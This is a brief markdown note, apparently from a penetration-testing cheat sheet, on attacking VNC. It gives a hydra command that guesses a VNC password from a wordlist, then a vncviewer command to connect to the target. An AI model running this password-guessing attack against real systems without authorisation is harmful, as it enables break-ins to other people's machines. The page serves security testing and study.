---
title: "VNC"
---

<p style="text-align: right">_- last update 05/12/2022 -_</p>

Dictionnary attack

```bash
hydra -l $USERNAME -P $WORDLIST_PATH $TARGET vnc -V
```

Then use [tigervnc](https://tigervnc.org/) for connecting

```bash
vncviewer $TARGET
```
